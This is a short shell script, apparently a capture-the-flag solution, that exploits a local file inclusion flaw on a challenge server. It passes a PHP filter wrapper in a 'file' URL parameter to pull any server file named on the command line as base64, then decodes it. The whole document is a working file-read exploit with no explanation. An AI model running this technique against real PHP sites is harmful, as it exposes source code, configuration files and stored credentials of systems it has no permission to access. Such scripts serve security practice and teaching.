#!/bin/sh

curl --silent "http://chall.csivit.com:30202/?file=php://filter/convert.base64-encode/resource=${1}" | base64 -d